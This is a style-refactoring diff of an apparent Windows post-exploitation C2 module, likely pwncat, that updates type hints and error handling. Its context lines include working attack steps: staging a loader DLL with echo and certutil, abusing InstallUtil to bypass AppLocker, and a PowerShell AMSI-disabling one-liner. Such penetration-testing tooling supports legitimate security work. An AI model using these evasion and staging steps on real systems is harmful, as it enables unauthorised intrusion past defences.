@@ -30,7 +30,7 @@ import functools
 import threading
 import subprocess
 from io import BytesIO, RawIOBase, TextIOWrapper
-from typing import List, Union, BinaryIO, Optional
+from typing import BinaryIO
 from subprocess import TimeoutExpired, CalledProcessError
 from dataclasses import dataclass
 
@@ -136,7 +136,7 @@ class WindowsFile(RawIOBase):
 
         return data
 
-    def readinto(self, b: Union[memoryview, bytearray]):
+    def readinto(self, b: memoryview | bytearray):
 
         if self.eof:
             return 0
@@ -150,7 +150,7 @@ class WindowsFile(RawIOBase):
                 self.eof = True
                 return 0
 
-            raise IOError(exc.message) from exc
+            raise OSError(exc.message) from exc
 
         data = base64.b64decode(result["data"])
         b[: len(data)] = data
@@ -182,14 +182,14 @@ class WindowsFile(RawIOBase):
                 if exc.code == 0x6D:
                     self.eof = True
                     break
-                raise IOError(exc.message) from exc
+                raise OSError(exc.message) from exc
 
             nwritten += result["count"]
 
         return nwritten
 
 
-class DotNetPlugin(object):
+class DotNetPlugin:
     """Represents a reflectively loaded .Net plugin within the remote C2
     This class is a helper which makes calling methods within a plugin
     more straightforward. If you want to call a method named ``get_system``
@@ -285,7 +285,7 @@ class PopenWindows(pwncat.subprocess.Popen):
                 )
             if self.stdin is not None:
                 self.stdin = TextIOWrapper(
-                    self.stdin, encoding=encoding, errors=errors, write_through=True
+                    self.stdin, encoding=encoding, errors=errors, write_through=True,
                 )
 
     def detach(self):
@@ -419,7 +419,7 @@ class BuiltinPluginInfo:
 
     name: str
     """ A friendly name used when loading the plugin """
-    provides: List[str]
+    provides: list[str]
     """ List of DLL names which this plugin provides """
     url: str
     """ URL pointing to a tar.gz file containing the plugin DLL(s) """
@@ -591,7 +591,7 @@ class Windows(Platform):
                     continue
                 except KeyboardInterrupt:
                     self.session.log(
-                        "[yellow]warning[/yellow]: waiting for command to complete"
+                        "[yellow]warning[/yellow]: waiting for command to complete",
                     )
                     keyboard_interrupt = True
 
@@ -661,13 +661,13 @@ function prompt {
             loader_remote_path = pathlib.PureWindowsPath(possible) / loader_encoded_name
             good_dir = possible
             self.channel.send(
-                f"""echo {chunk} >"{str(loader_remote_path)}"\n""".encode("utf-8")
+                f"""echo {chunk} >"{loader_remote_path!s}"\n""".encode(),
             )
             self.channel.recvline()
             result = self.channel.recvuntil(b">")
             if b"denied" not in result.lower():
                 self.session.log(
-                    f"dropping stage one in {repr(str(loader_remote_path))}"
+                    f"dropping stage one in {str(loader_remote_path)!r}",
                 )
                 break
         else:
@@ -676,31 +676,25 @@ function prompt {
         # Write remaining chunks to selected path
         for c in range(chunk_sz, len(loader_dll), chunk_sz):
             self.channel.send(
-                f"""echo {loader_dll[c:c + chunk_sz].decode('utf-8')} >>"{str(loader_remote_path)}"\n""".encode(
-                    "utf-8"
-                )
+                f"""echo {loader_dll[c:c + chunk_sz].decode('utf-8')} >>"{loader_remote_path!s}"\n""".encode(),
             )
             self.channel.recvline()
             self.channel.recvuntil(b">")
 
         # Decode the base64 to the actual dll
         self.channel.send(
-            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
-                "utf-8"
-            )
+            f"""certutil -decode "{loader_remote_path!s}" "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(),
         )
         self.channel.recvline()
         self.channel.recvuntil(b">")
 
-        self.channel.send(f"""del "{str(loader_remote_path)}"\n""".encode("utf-8"))
+        self.channel.send(f"""del "{loader_remote_path!s}"\n""".encode())
         self.channel.recvline()
         self.channel.recvuntil(b">")
 
         # Search for all instances of InstallUtil within all installed .Net versions
         self.channel.send(
-            """cmd /c "dir \\Windows\\Microsoft.NET\\* /s/b | findstr InstallUtil.exe$"\n""".encode(
-                "utf-8"
-            )
+            b"""cmd /c "dir \\Windows\\Microsoft.NET\\* /s/b | findstr InstallUtil.exe$"\n""",
         )
         self.channel.recvline()
 
@@ -713,16 +707,14 @@ function prompt {
         version = pathlib.PureWindowsPath(install_utils).parts[-2]
 
         self.session.log(
-            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False
+            f"using install utils from .net [cyan]{version}[/cyan]", highlight=False,
         )
 
         install_utils = install_utils.replace(" ", "\\ ")
 
         # Execute Install-Util to bypass AppLocker/CLM
         self.channel.send(
-            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
-                "utf-8"
-            )
+            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(),
         )
 
         # Wait for loader to
@@ -750,7 +742,7 @@ function prompt {
         # Bypass AMSI
         try:
             self.powershell(
-                """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0); if( $ptr -ne $null -and $ptr -ne 0 ) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); }"""
+                """$am = ([Ref].Assembly.GetTypes()  | % { If ( $_.Name -like "*iUtils" ){$_} })[0];$con = ($am.GetFields('NonPublic,Static') | % { If ( $_.Name -like "*Context" ){$_} })[0];$addr = $con.GetValue($null);[IntPtr]$ptr = $addr;[Int32[]]$buf = @(0); if( $ptr -ne $null -and $ptr -ne 0 ) { [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1); }""",
             )
         except PowershellError:
             self.session.log("[yellow]warning[/yellow]: failed to disable AMSI!")
@@ -777,7 +769,7 @@ function prompt {
 
         if self.interactive:
             raise PlatformError(
-                "cannot open non-interactive process in interactive mode"
+                "cannot open non-interactive process in interactive mode",
             )
 
         if shell:
@@ -802,8 +794,7 @@ function prompt {
         except ProtocolError as exc:
             if "pipe" in exc.message:
                 raise OSError(exc.message)
-            else:
-                raise FileNotFoundError(exc.message)
+            raise FileNotFoundError(exc.message)
 
         return PopenWindows(
             self,
@@ -846,7 +837,7 @@ function prompt {
                     if not interactive_complete.is_set():
                         sys.stdout.write("\n")
                         self.session.manager.log(
-                            "[yellow]warning[/yellow]: Ctrl-C does not work for windows targets"
+                            "[yellow]warning[/yellow]: Ctrl-C does not work for windows targets",
                         )
                 except EOFError:
                     self.channel.send(b"\rexit\r")
@@ -935,7 +926,7 @@ function prompt {
 
     def open(
         self,
-        path: Union[str, Path],
+        path: str | Path,
         mode: str = "r",
         buffering: int = -1,
         encoding: str = "utf-8",
@@ -986,7 +977,7 @@ function prompt {
 
         try:
             p = self.run(
-                ["where.exe", path], capture_output=True, text=True, check=True
+                ["where.exe", path], capture_output=True, text=True, check=True,
             )
 
             return p.stdout.strip()
@@ -998,13 +989,13 @@ function prompt {
         through System.Security.Principal.WindowsIdentity::GetCurrent().User."""
 
         self.user_info = self.powershell(
-            "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value"
+            "[System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value",
         )[0]
 
         # Check if we are an administrator
         try:
             result = self.powershell(
-                "(New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)"
+                "(New-Object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)",
             )
 
             if not result:
@@ -1056,12 +1047,11 @@ function prompt {
             msg = str(exc)
             if "not exist" in msg:
                 raise FileNotFoundError(kwargs["Path"])
-            elif "exist" in msg:
+            if "exist" in msg:
                 raise FileExistsError(kwargs["Path"])
-            elif "directory" in msg:
+            if "directory" in msg:
                 raise NotADirectoryError(kwargs["Path"])
-            else:
-                raise PermissionError(kwargs["Path"])
+            raise PermissionError(kwargs["Path"])
 
     def abspath(self, path: str) -> str:
         """Convert the given relative path to absolute.
@@ -1074,7 +1064,7 @@ function prompt {
 
         try:
             result = self.powershell(
-                f'$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath("{path}")'
+                f'$ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath("{path}")',
             )
             return result[0]
         except PowershellError as exc:
@@ -1103,7 +1093,7 @@ function prompt {
                 value = "$true"
 
             self.powershell(
-                f'Set-ItemProperty -Path "{path}" -Name IsReadOnly -Value {value}'
+                f'Set-ItemProperty -Path "{path}" -Name IsReadOnly -Value {value}',
             )
         except PowershellError as exc:
             if "not exist" in str(exc):
@@ -1176,10 +1166,9 @@ function prompt {
         except PowershellError as exc:
             if "not exist" in str(exc):
                 raise FileNotFoundError(path)
-            elif "directory" in str(exc):
+            if "directory" in str(exc):
                 raise NotADirectoryError(path)
-            else:
-                raise PermissionError(path)
+            raise PermissionError(path)
 
     def lstat(self):
         """Perform stat on a link instead of the target of the link."""
@@ -1300,7 +1289,7 @@ function prompt {
         return result
 
     def tempfile(
-        self, mode: str, length: Optional[int] = 8, suffix: Optional[str] = None
+        self, mode: str, length: int | None = 8, suffix: str | None = None,
     ):
         """Create a temporary file in a safe directory. Optionally provide a suffix"""
 
@@ -1311,7 +1300,7 @@ function prompt {
 
         # Get the temporary directory
         path = self.Path(
-            self.powershell("$_ = [System.IO.Path]::GetTempPath() ; $_")[0]
+            self.powershell("$_ = [System.IO.Path]::GetTempPath() ; $_")[0],
         )
         name = ""
 
@@ -1339,7 +1328,7 @@ function prompt {
                 raise FileNotFoundError(path)
             raise PermissionError(path)
 
-    def umask(self, mask: Optional[int] = None):
+    def umask(self, mask: int | None = None):
         """Set or retrieve the current umask value"""
 
         raise NotImplementedError("windows platform does not support umask")
@@ -1394,7 +1383,7 @@ function prompt {
 
         return self._is_system
 
-    def powershell(self, script: Union[str, BinaryIO], depth: int = 1):
+    def powershell(self, script: str | BinaryIO, depth: int = 1):
         """Execute a powershell script in the context of the C2. The results
         of the command are automatically serialized with ``ConvertTo-Json``.
         You can control the depth of serialization, although with large objects
@@ -1437,7 +1426,7 @@ function prompt {
         return self.impersonate(0)
 
     def dotnet_load(
-        self, name: str, content: Optional[Union[bytes, BytesIO]] = None
+        self, name: str, content: bytes | BytesIO | None = None,
     ) -> DotNetPlugin:
         """
         Reflectively load a .Net C2 plugin from the attacker machine. The
